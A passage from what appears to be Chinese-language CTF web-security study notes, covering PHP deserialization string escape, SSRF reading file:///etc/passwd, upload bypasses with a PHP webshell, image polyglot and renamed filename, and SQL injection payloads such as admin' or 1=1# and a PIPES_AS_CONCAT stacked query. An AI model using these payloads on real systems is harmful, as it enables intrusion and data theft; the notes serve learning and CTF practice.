</span></span><span class=line><span class=cl>        <span class=nv>$str</span> <span class=o>=</span> <span class=nx>substrstr</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;nep1&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;[welcome to&#34;</span> <span class=o>.</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;nep&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;CTF]&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 原: %f0123%f0123%f0123%9f%9f%f0123[Welcome toNepCTF]
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// 后: str = NepCTF] 效果:右移3*3个,左移2次,右移3个
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=nv>$str</span> <span class=o>===</span> <span class=s1>&#39;NepCTF]&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>b</span><span class=p>)();</span> <span class=c1>// b为phpinfo, 可以执行phpinfo;
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>C</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$s</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$str</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$s</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>s</span> <span class=o>=</span> <span class=nv>$s</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>str</span><span class=p>;</span> <span class=c1>// str为对象, 将对象作为字符串输出调用_tostring
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$ser</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>C</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>]));</span>
</span></span><span class=line><span class=cl><span class=c1>// $_GET[&#39;c&#39;]: &#34;;s:3:&#34;str&#34;;O:1:&#34;B&#34;:1:{s:1:&#34;b&#34;;s:7:&#34;phpinfo&#34;;}}绕过
</span></span></span><span class=line><span class=cl><span class=c1>// $ser: O:1:&#34;C&#34;:2:{s:1:&#34;s&#34;;s:94:&#34;&#34;;s:3:&#34;str&#34;;O:1:&#34;B&#34;:1:{s:1:&#34;b&#34;;s:7:&#34;phpinfo&#34;;}}&#34;;s:3:&#34;str&#34;;N;}
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$data</span> <span class=o>=</span> <span class=nx>str_ireplace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\0</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;00&#34;</span><span class=p>,</span> <span class=nv>$ser</span><span class=p>);</span> <span class=c1>// 不区分大小写 字符串替换
</span></span></span><span class=line><span class=cl><span class=c1>// $data: O:1:&#34;C&#34;:2:{s:1:&#34;s&#34;;s:94:&#34;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#34;;s:3:&#34;str&#34;;O:1:&#34;B&#34;:1:{s:1:&#34;b&#34;;s:7:&#34;phpinfo&#34;;}}&#34;;s:3:&#34;str&#34;;N;}
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span></span></span></code></pre></div></div><p>此时构建的结构为：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;C&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;s&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>94</span><span class=o>:</span><span class=s2>&#34;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;str&#34;</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;B&#34;</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;b&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>7</span><span class=o>:</span><span class=s2>&#34;phpinfo&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=s2>&#34;;s:3:&#34;</span><span class=nx>str</span><span class=s2>&#34;;N;} 忽略了
</span></span></span></code></pre></div></div><h3 id=ssrf漏洞>SSRF漏洞</h3><p><strong>漏洞点</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;url&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$ch</span> <span class=o>=</span> <span class=nx>curl_init</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_URL</span><span class=p>,</span> <span class=nv>$url</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span> <span class=o>=</span> <span class=nx>curl_exec</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span> <span class=c1>// 获取指定 URL 内容并输出
</span></span></span></code></pre></div></div><p><strong>特殊文件协议</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://target.com/script.php?url<span class=o>=</span>file:///etc/passwd <span class=c1>#尝试让服务器本身执行命令</span></span></span></code></pre></div></div><h3 id=文件上传漏洞>文件上传漏洞</h3><p><strong>文件操作</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;REQUEST_METHOD&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;POST&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nv>$uploadDir</span> <span class=o>=</span> <span class=s2>&#34;uploads/&#34;</span><span class=p>;</span> <span class=c1>// 上传目录
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$uploadDir</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>mkdir</span><span class=p>(</span><span class=nv>$uploadDir</span><span class=p>,</span> <span class=mo>0777</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span> <span class=c1>// 创建目录
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;image&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// $_FILES 超级全局数组, 专用于处理文件上传
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$fileName</span> <span class=o>=</span> <span class=nx>basename</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;image&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>]);</span> <span class=c1>// 文件名
</span></span></span><span class=line><span class=cl><span class=c1></span>        
</span></span><span class=line><span class=cl>        <span class=nv>$allowedTypes</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;image/jpeg&#39;</span><span class=p>,</span> <span class=s1>&#39;image/png&#39;</span><span class=p>,</span> <span class=s1>&#39;image/gif&#39;</span><span class=p>];</span> <span class=c1>// 文件验证
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$fileType</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;image&#39;</span><span class=p>][</span><span class=s1>&#39;type&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$fileType</span><span class=p>,</span> <span class=nv>$allowedTypes</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Error: Unsupported file type.&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$maxSize</span> <span class=o>=</span> <span class=mi>2</span> <span class=o>*</span> <span class=mi>1024</span> <span class=o>*</span> <span class=mi>1024</span><span class=p>;</span> <span class=c1>// 2MB
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$fileSize</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;image&#39;</span><span class=p>][</span><span class=s1>&#39;size&#39;</span><span class=p>];</span> <span class=c1>// 文件大小限制
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=nv>$fileSize</span> <span class=o>&gt;</span> <span class=nv>$maxSize</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Error: File size is too large.&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// 构建完整文件路径
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$filePath</span> <span class=o>=</span> <span class=nv>$uploadDir</span> <span class=o>.</span> <span class=nv>$fileName</span><span class=p>;</span> <span class=c1>// . 用于PHP字符串拼接
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=c1>// 移动文件到指定目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$fileTmpName</span><span class=p>,</span> <span class=nv>$filePath</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;上传图片在：&#34;</span> <span class=o>.</span> <span class=nv>$filePath</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;上传失败&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;无文件上传&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p><strong>过滤</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-php"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$ext</span> <span class=o>=</span> <span class=nx>pathinfo</span><span class=p>(</span><span class=nv>$file_name</span><span class=p>,</span> <span class=nx>PATHINFO_EXTENSION</span><span class=p>);</span> <span class=c1>// 获取扩展名
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span><span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$ext</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;x&#39;</span><span class=p>,</span><span class=s1>&#39;x&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>	<span class=k>exit</span><span class=p>(</span><span class=s1>&#39;no&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>上传一句话木马到相应目录中，且该目录可通过URL访问，使用蚁剑连接【url为文件地址，密码为post中数据】</p><p><code>https://www.cnblogs.com/ash-33/p/16397536.html</code>中有一些一句话木马</p><p><strong>图片木马</strong></p><p>在<code>cmd</code>中运行<code>copy pho.png/b+hello.php/a hack.png</code>将图片和php木马结合</p><p><strong>文件上传抓包</strong></p><p>将下面<code>filename</code>改为<code>hack.php</code>即可</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nx>Content</span><span class=o>-</span><span class=nx>Type</span><span class=o>:</span> <span class=nx>multipart</span><span class=o>/</span><span class=nx>form</span><span class=o>-</span><span class=nx>data</span><span class=p>;</span> <span class=nx>boundary</span><span class=o>=---------------------------</span><span class=mi>1104904014997412098933705552</span>
</span></span><span class=line><span class=cl><span class=nx>Content</span><span class=o>-</span><span class=nx>Length</span><span class=o>:</span> <span class=mi>727</span>
</span></span><span class=line><span class=cl><span class=nx>DNT</span><span class=o>:</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=nx>Connection</span><span class=o>:</span> <span class=nx>close</span>
</span></span><span class=line><span class=cl><span class=nx>Referer</span><span class=o>:</span> <span class=nx>http</span><span class=o>://</span><span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=o>:</span><span class=mi>40349</span><span class=o>/</span>
</span></span><span class=line><span class=cl><span class=nx>Priority</span><span class=o>:</span> <span class=nx>u</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>-----------------------------</span><span class=mi>1104904014997412098933705552</span>
</span></span><span class=line><span class=cl><span class=nx>Content</span><span class=o>-</span><span class=nx>Disposition</span><span class=o>:</span> <span class=nx>form</span><span class=o>-</span><span class=nx>data</span><span class=p>;</span> <span class=nx>name</span><span class=o>=</span><span class=s2>&#34;image&#34;</span><span class=p>;</span> <span class=nx>filename</span><span class=o>=</span><span class=s2>&#34;hack.php&#34;</span>
</span></span><span class=line><span class=cl><span class=nx>Content</span><span class=o>-</span><span class=nx>Type</span><span class=o>:</span> <span class=nx>image</span><span class=o>/</span><span class=nx>png</span>
</span></span><span class=line><span class=cl><span class=nx>xxxxxx</span>
</span></span><span class=line><span class=cl><span class=o>-----------------------------</span><span class=mi>1104904014997412098933705552</span><span class=o>--</span></span></span></code></pre></div></div><p><strong>php拓展名</strong></p><ul><li><code>.php3</code>，<code>.php4</code>，<code>.php5</code>，<code>.php7</code>，<code>.phtml</code>，<code>.phps</code>，<code>.pht</code></li></ul><h3 id=sql注入漏洞>SQL注入漏洞</h3><p><strong>MySQL中的注释：</strong></p><ul><li><code>#</code>，直接加注释内容，有时需要注意可能被解析为页内跳转，所以使用<code>%23</code></li><li><code>--</code>，<code>--</code>注释符后需要加一个空格，注释才能生效</li><li><code>/* */</code>，多行注释符</li><li><code>-+</code>，注释变体</li></ul><p><strong>php连接mysql</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nv>$pwd</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;pwd&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$pwd</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$pwd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=nv>$conn</span> <span class=o>=</span> <span class=nx>mysqli_connect</span><span class=p>(</span><span class=s2>&#34;主机名&#34;</span><span class=p>,</span> <span class=s2>&#34;用户名&#34;</span><span class=p>,</span> <span class=s2>&#34;密码&#34;</span><span class=p>,</span> <span class=s2>&#34;数据库名&#34;</span><span class=p>,</span> <span class=nx>端口</span><span class=p>);</span> <span class=c1>// 变量填$password
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span><span class=p>(</span><span class=nv>$conn</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Mysql connect error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// 选择数据库
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$selectDB</span> <span class=o>=</span> <span class=nx>mysqli_select_db</span><span class=p>(</span><span class=nv>$conn</span><span class=p>,</span> <span class=nv>$dbName</span><span class=p>);</span></span></span></code></pre></div></div><p><strong>sql fuzz</strong>：使用<code>https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/detect/xplatform.txt</code>中的数据结合 burpsuite 进行模糊测试</p><h4 id=漏洞点>漏洞点</h4><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-php"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$sql</span> <span class=o>=</span> <span class=s2>&#34;SELECT * FROM admin WHERE email=&#39;</span><span class=si>$email</span><span class=s2>&#39; AND pwd=&#39;</span><span class=si>$pwd</span><span class=s2>&#39;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$conn</span><span class=p>,</span> <span class=nv>$sql</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$row</span> <span class=o>=</span> <span class=nx>mysqli_fetch_array</span><span class=p>(</span><span class=nv>$result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$row</span><span class=p>)</span> <span class=p>{}</span></span></span></code></pre></div></div><p>此处可使用<code>payload</code>：</p><ol><li>万能密码型：<code>admin' or 1 = 1#</code><ol><li><code>SELECT * FROM admin WHERE email='a@e.com'OR 1 = 1# AND pwd='$pwd'</code></li></ol></li><li>联合型：<code>b' UNION SELECT * FROM admin WHERE 1 = 1--</code><ol><li><code>SELECT * FROM admin WHERE email='a@e.com' UNION SELECT * FROM admin WHERE 1 = 1-- AND pwd='$pwd'</code></li></ol></li><li>万能密码2型：<code>admin' = ''-- </code>即 False=&rsquo;&rsquo; 恒成立<ol><li><strong><code>SELECT * FROM admin WHERE email='a@e.com' = ''-- AND pwd='$pwd'</code></strong></li></ol></li></ol><p><strong>拼接</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-php"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$sql</span> <span class=o>=</span> <span class=s2>&#34;select &#34;</span><span class=o>.</span><span class=nv>$post</span><span class=p>[</span><span class=s1>&#39;query&#39;</span><span class=p>]</span><span class=o>.</span><span class=s2>&#34;||flag from Flag&#34;</span><span class=p>;</span> <span class=c1>// ||默认为或运算符，未使用预处理语句
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>mysqli_multi_query</span><span class=p>(</span><span class=nv>$conn</span><span class=p>,</span> <span class=nv>$sql</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>do</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$res</span> <span class=o>=</span> <span class=nx>mysqli_store_result</span><span class=p>(</span><span class=nv>$conn</span><span class=p>)){</span> <span class=c1>// 获取查询结果
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>while</span><span class=p>(</span><span class=nv>$row</span> <span class=o>=</span> <span class=nx>mysqli_fetch_row</span><span class=p>(</span><span class=nv>$res</span><span class=p>)){</span> <span class=c1>// 逐行获取查询结果并打印
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nx>print_r</span><span class=p>(</span><span class=nv>$row</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>while</span><span class=p>(</span><span class=o>@</span><span class=nx>mysqli_next_result</span><span class=p>(</span><span class=nv>$conn</span><span class=p>));</span> <span class=c1>// 支持多条SQL语句执行
</span></span></span></code></pre></div></div><ul><li>查看数据表Flag所有列内容，且添加一个由列flag的值与1拼接/异或后生成的新列获取flag值，视不同sql而不同</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-sql"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>#</span><span class=w> </span><span class=o>*</span><span class=p>,</span><span class=mi>1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=p>,</span><span class=mi>1</span><span class=o>||</span><span class=n>flag</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>Flag</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>|</span><span class=w>  </span><span class=n>x</span><span class=w>   </span><span class=o>|</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>x</span><span class=w>    </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w>  </span><span class=n>abc</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>1</span><span class=o>||</span><span class=n>abc</span><span class=w>    </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>2</span><span class=w> </span><span class=o>|</span><span class=w>  </span><span class=n>xyz</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>1</span><span class=o>||</span><span class=n>xyz</span><span class=w>    </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+------+-----------+</span></span></span></code></pre></div></div><ul><li>修改||为拼接，将返回1flag{xxx}</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-sql"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>#</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=k>set</span><span class=w> </span><span class=n>sql_mode</span><span class=o>=</span><span class=n>PIPES_AS_CONCAT</span><span class=p>;</span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=k>set</span><span class=w> </span><span class=n>sql_mode</span><span class=o>=</span><span class=n>PIPES_AS_CONCAT</span><span class=p>;</span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=o>||</span><span class=n>flag</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>Flag</span><span class=p>;</span></span></span></code></pre></div></div><p><strong>预处理语句</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-php"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$stmt</span> <span class=o>=</span> <span class=nv>$conn</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span><span class=s2>&#34;SELECT ? FROM Flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>bind_param</span><span class=p>(</span><span class=s2>&#34;s&#34;</span><span class=p>,</span> <span class=nv>$post</span><span class=p>[</span><span class=s1>&#39;query&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>execute</span><span class=p>();</span></span></span></code></pre></div></div><h4 id=联合注入>联合注入</h4><p><strong>验证查询返回列</strong></p><ul><li>union select</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-mysql"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
